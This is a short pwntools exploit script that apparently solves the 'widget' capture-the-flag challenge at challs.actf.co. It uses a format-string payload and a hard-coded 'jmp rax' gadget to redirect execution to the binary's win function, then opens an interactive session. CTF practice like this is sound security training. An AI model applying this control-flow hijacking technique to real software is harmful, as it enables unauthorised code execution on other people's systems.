from pwn import *

context.terminal=["konsole", "-e"]

e = ELF("./widget")

p = process(["./widget"])
p = remote("challs.actf.co", 31320)
gdb.attach(p)




padded = "%{}p".format(e.sym['win'] - 50 - 27 + 0x64 + 8 + 0x42)

padded = padded.ljust(32, "A")

jmprax = 0x000000000040120c

exp = padded + p64(e.sym["called"]+0x90) + p64(jmprax)


p.sendlineafter(": ", str(len(exp)))

p.sendlineafter(": ", exp)

p.interactive()